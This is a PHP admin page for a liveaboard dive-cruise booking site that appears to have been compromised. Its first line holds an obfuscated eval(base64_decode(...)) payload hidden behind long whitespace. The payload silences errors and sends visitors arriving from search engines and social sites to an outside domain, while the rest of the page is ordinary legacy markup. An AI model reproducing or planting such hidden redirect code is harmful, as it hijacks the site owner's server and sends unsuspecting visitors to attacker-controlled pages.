<?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0="));	                                       			 session_start();
if(!isset($_SESSION['signid'])){header("location:login.php");}
define( '_VALID_MOS', 1 ); 
require_once('../mod/conn.php'); ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><TITLE>Liveaboards - Dive &amp; Cruises</TITLE>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<STYLE type=text/css></STYLE>

<META content="MSHTML 6.00.2800.1476" name=GENERATOR>
   <script language="JavaScript">
 function confirmlogout(){
    if( window.confirm("Logout ?")=="1" ) { 
	  return true;
   } else {
	  	return false;
    }
 } 
 
 function confirmempty(){
    if( window.confirm("Empty Records ?")=="1" ) { 
	  return true;
   } else {
	  	return false;
    }
 } 
 
  function confirmdel(){
    if( window.confirm("Delete Record?")=="1" ) { 
	  return true;
   } else {
	  	return false;
    }
 } 
 
function confirmSubmit()
{
var agree=confirm("Are you sure you wish to continue?");
if (agree)
	return true ;
else
	return false ;
}

 </script>
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_jumpMenu(targ,selObj,restore){ //v3.0
  eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'");
  if (restore) selObj.selectedIndex=0;
}
//-->
</script>
<style>
  body, td, p, input, select { font-family: Verdana, Arial, Helvetica; font-size: 8pt; color: #000000; }
  a { color: #000000; }
  A:active {
	COLOR: #0000CC; TEXT-DECORATION: none
}
A:visited {
	COLOR: #0000CC; TEXT-DECORATION: none
}
A:link {
	COLOR: #0000CC; TEXT-DECORATION: none
}
A:hover {
	COLOR: #FF0000; TEXT-DECORATION: underline
}
.style1 {
	font-size: 12px;
	font-weight: bold;
}
.style27 {color: #0033CC}
.style30 {color: #0033CC; font-weight: bold; }
.style31 {color: #FFFFFF}
.btnDelete {color : #0000CC; background-color:#FFFFFF; border:0px #FFFFFF solid; cursor:hand;}
.btnDelete1{color : #0000CC; background-color:#FFFFFF; border:0px #FFFFFF solid; text-decoration:underline;}
</style>
</HEAD>
<BODY bottomMargin=0 bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 
marginheight="0" marginwidth="0">
<TABLE width="775" border=0 align="center" cellPadding=0 cellSpacing=0>
  <TBODY>
  <TR>
    <TD>
      <TABLE height=194 cellSpacing=0 cellPadding=0 width="100%" 
      background="../images/z3.gif" border=0>
        <TBODY>
        <TR>
              <TD height="194" vAlign=top> 
                <TABLE cellSpacing=0 cellPadding=0 width="100%" 
            background="../images/dotline.gif" 
              border=0><TBODY>
              <TR>
                <TD height=1><IMG height=1 
                  src="../images/dotline.gif" 
              width=3></TD></TR></TBODY></TABLE>
                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                  <tr> 
                    <td width="332" height="171" valign="bottom" background="../images/z1.jpg">
<TABLE width="180" height=40 
                              border=0 align="right" cellPadding=2 cellSpacing=0>
                        <TBODY>
                          <TR> 
                            <TD bgcolor="#ffffff"><IMG height=40 
                                src="../images/m3.jpg" 
                                width=67></TD>
                            <TD bgcolor="#ffffff"><IMG height=40 
                                src="../images/m4.jpg" 
                                width=67></TD>
                            <TD bgcolor="#ffffff"><IMG height=40 
                                src="../images/m2.jpg" 
                                width=67></TD>
                          </TR>
                          <TR> 
                            <TD colspan="3"><img src="../images/spacer.gif" width="10" height="67"></TD>
                          </TR>
                        </TBODY>
                      </TABLE>
                      <div align="left">
                        <table width="115"  border="0" align="left" cellpadding="0" cellspacing="0">
                          <tr>
                            <td width="112">&nbsp;</td>
                          </tr>
                          <tr>
                            <td>&nbsp;</td>
                          </tr>
                          <tr>
                            <td height="22">&nbsp;</td>
                          </tr>
                          <tr>
                            <td><div align="center"><img src="../images/germanflag.gif" width="43" height="30" border="0" usemap="#MapMap"><br>
                                    <strong>Deutsche Webseite </strong>
                                    <map name="MapMap">
                                      <area shape="rect" coords="0,-12,41,28" href="../german/data/login.php">
                                    </map>
                            </div></td>
                          </tr>
                        </table>
                      </div></td>
                    <td width="123" background="../images/z2.jpg">&nbsp;</td>
                    <td width="320" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                        <tr>
                          <td><img src="../images/spacer.gif" width="10" height="45"></td>
                        </tr>
                        <tr> 
                          <td height="22" valign="top">&nbsp;&nbsp;<span class="style1"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif"><a href="../index.php">Home</a></font></span></td>
                        </tr>
                        <tr> 
                          <td><img src="../images/m1.jpg" width="325" height="104"></td>
                        </tr>
                      </table></td>
                  </tr>
                  <tr> 
                    <td colspan="3" bgcolor="#006699"> <div align="right"><strong><font size="2" face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></strong></div></td>
                  </tr>
                </table></TD></TR></TBODY></TABLE></TD></TR>
  <TR>
    <TD bgColor=#ffffff>
      <TABLE cellSpacing=0 cellPadding=0 width="775" border=0>
        <TBODY>
        <TR>
              <TD width=330 align=middle vAlign=top bgcolor="#41C9D7"> <table width="100%" border="0" cellspacing="0" cellpadding="0">
                  <tr> 
                    <td height="177">
<table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
                        <tr> 
                          <td height="176" valign="top" background="../images/bgsearch.jpg"> 
                            <table width="88%" border="0" align="right" cellpadding="0" cellspacing="0">
              <tr> 
                <td height="42">&nbsp;</td>
              </tr>
              <tr> 
                <td><?php	                                       			 include "../mod/mod_search.php"; ?></td>
              </tr>
            </table></td>
                        </tr>
                      </table></td>
                  </tr>
                  <tr>
                    <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
                        <tr> 
                          <td height="187" valign="top" background="../images/bgdestination.jpg">
<table width="87%" border="0" align="center" cellpadding="0" cellspacing="0">
                            <tr>
                              <td height="33" colspan="2">&nbsp;</td>
                            </tr>
                            <tr>
                              <td width="9%"><div align="center"><strong><img src="../images/dot.gif" width="4" height="4"></strong></div></td>
                              <td width="91%" height="18"><span class="style27"><strong><span class="style1 style27"><font size="1" face="Verdana, Arial, Helvetica, sans-serif"><a href="../boats/liburan_index.php">Bunaken Marine Park - Sulawesi </a></font></span></strong></span></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="../images/dot.gif" width="4" height="4"></strong></div></td>
                                <td height="18"><span class="style27"><strong><font size="1" face="Verdana, Arial, Helvetica, sans-serif"><a href="../boats/monalisa_index.php">Komodo 
                                  Island and National Park</a></font><span class="style1 style27"><font size="1" face="Verdana, Arial, Helvetica, sans-serif"><a href="boats/adventure_index.php"></a> 
                                  </font></span></strong></span></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="../images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18"><span class="style27"><strong><span class="style1 style27"><font size="1" face="Verdana, Arial, Helvetica, sans-serif"><a href="../boats/wallacea_index.php">Sulwesi- Togian and Banggai Islands </a></font></span></strong></span></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="../images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18"><strong><font size="1" face="Verdana, Arial, Helvetica, sans-serif"><a href="../boats/moana_index.php">Komodo &amp; Irian Jaya</a></font></strong></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="../images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18"><font size="1" face="Verdana, Arial, Helvetica, sans-serif"><span class="style30"><a href="../boats/ombak_index.php"> Komodo Marine Park </a></span></font></td>
                            </tr>
                            <tr>
                              <td><div align="center"><strong><img src="../images/dot.gif" width="4" height="4"></strong></div></td>
                              <td height="18"><div align="center"><span class="style27"><strong><span class="style1 style27"><font size="1" face="Verdana, Arial, Helvetica, sans-serif"><a href="../boats/kararu_index.php">Komodo/Alor/Flores/Irian, Raja Ampat <br>
                                &quot;Exclusive Liveaboard&quot; </a></font></span></strong></span></div></td>
                            </tr>
                            <tr>
                              <td height="18" colspan="2"><div align="center">
                                    <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5,0,0,0" width="103" height="24">
                                      <param name="movie" value="../liveaboards/hotdeals.swf">
                                    <param name="quality" value="high">
                                    <param name="bgcolor" value="#4FB7DC">
                                    <embed src="../liveaboards/hotdeals.swf" quality="high" pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="103" height="24" bgcolor="#4FB7DC"></embed>
                                  </object>
                              </div></td>
                            </tr>
                            <tr>
                              <td colspan="2"><img src="../images/spacer.gif" width="10" height="8"></td>
                            </tr>
                          </table></td>
                        </tr>
                      </table></td>
                  </tr>
                </table>
                <br>
              <br>              </TD>
          <TD vAlign=top width=5 
          background="../images/z6.jpg"><IMG height=4 
            src="../images/z6.jpg" width=5></TD>
          <TD vAlign=top>
            <TABLE cellSpacing=3 cellPadding=5 width=430 border=0>
			<form name="form1" method="post" action="<?php	                                       			 echo($PHP_SELF);?>">
                  <TBODY>
                    <TR> 
                      <TD height="28">Welcome <?php	                                       			 echo($_SESSION['name']);   ?></TD>
                    </TR>
                    <TR> 
                      <TD height="28"><a href="cruises.php">Add</a> | <a href="admin.php?id=E" onClick="return confirmempty()">Empty 
                        Records</a> | <a href="logout.php" onClick="return confirmlogout()">Logout</a> |<input name="delete" type="submit" id="delete" value="Delete" class="btnDelete" onClick="return confirmSubmit();"></TD>
                    </TR>
                    <TR>
                      <TD height="28"><hr size="1" noshade></TD>
                    </TR>
                    <TR> 
                      <TD height="28">
                        <?php	                                       			 include "../mod/mod_cruiselist.php";?>
                      </TD>
                    </TR>
                  </TBODY>
				  </form>
                </TABLE></TD></TR></TBODY></TABLE></TD></TR>
  <TR>
    <TD>
      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%" 
      background="../images/z4.gif" border=0>
          <TBODY>
            <TR> 
              <TD height="8"><img src="../images/spacer.gif" width="10" height="8"></TD>
            </TR>
            <TR>
              <TD height="18" bgcolor="#FFFFFF"><div align="center">2005 &copy; 
                  Copyright Liveaboard. All rights Reserved</div></TD>
            </TR>
          </TBODY>
        </TABLE></TD></TR></TBODY></TABLE></BODY></HTML>
